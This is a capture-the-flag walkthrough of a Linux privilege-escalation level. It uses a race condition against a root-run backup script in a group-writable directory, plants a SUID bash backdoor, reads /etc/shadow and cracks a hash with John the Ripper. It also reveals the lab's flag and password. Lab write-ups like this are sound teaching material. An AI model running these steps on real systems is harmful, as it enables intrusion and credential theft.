level20 - root

Phase 1: Land and Recon (Initial Enumeration)
The player spawns into a restricted shell as level20. Their first move is to figure out what makes this specific environment unique.

Check Group Privileges:
The player runs id and instantly spots an unusual supplementary group:

Bash
level20@mastermind:~$ id
uid=1021(level20) gid=1021(level20) groups=1021(level20),1028(bt_backup)
Player Thought: "Okay, I belong to bt_backup. Let’s find what assets this group owns."

Locate the Infrastructure:
They search the filesystem for anything tagged with bt-backup or bt_backup:

Bash
find / -group bt_backup -type d 2>/dev/null
They discover /var/lib/bt-backup/. Inside, they find a goldmine of clues:

metadata/ (containing configuration fragments)

cache/generated/ (containing a script called run.sh)

backup.log and validation.log

Analyze System Timers:
Recognizing that automated tasks are a classic privilege escalation vector, they look for active cronjobs or systemd timers:

Bash
systemctl list-timers --all
They spot two highly unusual, hyper-frequent timers ticking away:

bt-backup.timer (Triggers every minute at :00)

bt-backup-execute.timer (Triggers every minute at :30)

Phase 2: Analyzing the Trust Boundary Flaw
The player reads the logs to understand what happens during those intervals.

Bash
cat /var/lib/bt-backup/backup.log
Tue Jun 16 03:00:00 PM UTC 2026 [INFO] Validation engine initialized

Tue Jun 16 03:00:01 PM UTC 2026 [INFO] Cache subsystem online

Tue Jun 16 03:00:30 PM UTC 2026 [EXEC] Running generated legacy cache...

The Logic Deduction:
The player realizes that at :00, a validation engine checks the configuration and regenerates a clean cache script (run.sh). Then, exactly 30 seconds later at :30, a root-privileged service blindly executes that exact script.

The Permission Flaw:
The player inspects the permissions of the directory where the code gets executed:

Bash
ls -la /var/lib/bt-backup/cache/
drwxrwxr-x 2 root bt_backup 4096 Jun 16 15:00 generated

Player Discovery: "Wait. The folder is writable by the bt_backup group. Even though root recreates a safe run.sh at :00, I have permission to delete and replace files inside this folder. I have a 29-second window between the validation check and the root execution!"

Phase 3: Writing the Exploit (The Race Condition)
The player knows a manual cp command might miss the tight window or fail due to execution speed, so they write a quick automated race-condition script.

Stage the Payload:
They create a script in /tmp/payload.sh designed to copy the standard Bash binary into a permanent location on the main disk and give it SUID permissions:

Bash
cat << 'EOF' > /tmp/payload.sh
#!/bin/bash
cp /bin/bash /var/lib/bt-backup/cache/generated/rootbash
chmod +s /var/lib/bt-backup/cache/generated/rootbash
EOF
Deploy the Interceptor Loop:
They launch a loop that constantly checks for root's safe file to drop at :00, deletes it instantly, and swaps it for their exploit payload:

Bash
while true; do
    if [ -f /var/lib/bt-backup/cache/generated/run.sh ]; then
        rm -f /var/lib/bt-backup/cache/generated/run.sh
        cp /tmp/payload.sh /var/lib/bt-backup/cache/generated/run.sh
        chmod +x /var/lib/bt-backup/cache/generated/run.sh
        echo "[+] Intercepted run.sh! Waiting for execution mark..."
        sleep 40
    fi
    sleep 0.1
done
Phase 4: Popping Root & The LabAdmin Crack
Catching the Shell:
The player watches their script print [+] Intercepted run.sh!. They wait for the clock to cross the :30 mark, kill the loop, and verify their backdoor exists:

Bash
ls -la /var/lib/bt-backup/cache/generated/rootbash
Seeing -rwsr-sr-x 1 root root, they execute it with preserved privileges:

Bash
/var/lib/bt-backup/cache/generated/rootbash -p
The prompt changes: rootbash-5.2#. They are now Root.

Reading the Final Twist:
They open /root/root.txt:

Bash
cat /root/root.txt
BT{R00T_1S_N0T_TH3_3ND}

The final secret belongs to the labadmin. Recover the password.

Cracking the Hash:
They extract the labadmin SHA-512 hash from /etc/shadow:

Bash
grep labadmin /etc/shadow
They take this hash over to their host machine (Kali), drop it into a file called hash.txt, and fire up John the Ripper against rockyou.txt:

Bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Within seconds, the terminal prints the ultimate flag and answer to the entire BreachTrail CTF: maradona10.
